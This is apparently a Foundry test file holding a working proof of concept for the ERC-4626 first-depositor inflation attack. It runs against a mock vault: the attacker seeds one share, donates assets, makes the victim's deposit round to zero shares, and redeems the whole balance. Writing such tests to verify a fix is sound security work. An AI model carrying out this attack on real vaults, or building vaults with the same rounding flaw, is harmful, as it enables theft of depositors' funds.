// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {VulnerableVault} from "../src/VulnerableVault.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

/// @notice Deterministic PoC for the ERC-4626 first-depositor
///         inflation attack. Witnesses the bug: passes while the bug exists,
///         would fail if virtual-shares / dead-shares / min-shares were added.
contract InflationAttackTest is Test {
    VulnerableVault internal vault;
    MockERC20 internal asset;

    address internal attacker = address(0xA77ACC);
    address internal victim   = address(0xB1B);

    function setUp() public {
        asset = new MockERC20("Asset", "AST");
        vault = new VulnerableVault(IERC20(address(asset)));
    }

    /// @notice Reproduces the 4-step inflation attack:
    ///   1. attacker mints 1 share with 1 wei
    ///   2. attacker donates 1e18 of asset directly to the vault
    ///   3. victim deposits 5e17 → receives ZERO shares (rounds down)
    ///   4. attacker redeems their 1 share → walks away with everything
    function test_PoC_firstDepositorInflation() public {
        uint256 donation      = 1e18;
        uint256 victimDeposit = 5e17;

        // --- Step 1: attacker seeds the vault with 1 wei → 1 share ---
        asset.mint(attacker, 1);
        vm.startPrank(attacker);
        asset.approve(address(vault), 1);
        uint256 attackerSharesMinted = vault.deposit(1, attacker);
        vm.stopPrank();

        assertEq(attackerSharesMinted, 1, "attacker seeds with 1 share");
        assertEq(vault.totalSupply(), 1);
        assertEq(vault.totalAssets(), 1);

        // --- Step 2: attacker donates directly (no shares minted) ---
        asset.mint(attacker, donation);
        vm.prank(attacker);
        asset.transfer(address(vault), donation);

        assertEq(vault.totalAssets(), donation + 1, "donation inflates assets");
        assertEq(vault.totalSupply(), 1,            "supply unchanged by donation");
        // Effective share price now: (donation + 1) / 1 = ~1e18 assets/share

        // --- Step 3: victim deposits → silently gets 0 shares ---
        asset.mint(victim, victimDeposit);
        vm.startPrank(victim);
        asset.approve(address(vault), victimDeposit);
        uint256 victimSharesMinted = vault.deposit(victimDeposit, victim);
        vm.stopPrank();

        // (5e17 * 1) / (1e18 + 1) = 0 in integer math.
        assertEq(victimSharesMinted, 0, "victim's deposit rounds to 0 shares");
        assertEq(vault.balanceOf(victim), 0);
        assertEq(asset.balanceOf(victim), 0, "victim's assets are GONE");

        // --- Step 4: attacker redeems 1 share, gets entire vault ---
        vm.prank(attacker);
        uint256 attackerOut = vault.redeem(1, attacker, attacker);

        uint256 totalPaidIntoVault = 1 + donation + victimDeposit;
        assertEq(attackerOut, totalPaidIntoVault, "attacker drains the vault");
        assertEq(asset.balanceOf(attacker), totalPaidIntoVault, "attacker holds all of the asset");

        // Net P&L = received - cost basis. Attacker spent 1 wei (seed) + donation.
        // They recover BOTH (donation returns to them, seed returns to them).
        // Net gain is exactly the victim's stolen deposit.
        uint256 attackerSpent = 1 + donation;
        uint256 netProfit = attackerOut - attackerSpent;
        assertEq(netProfit, victimDeposit, "net profit equals victim's stolen deposit");
    }
}
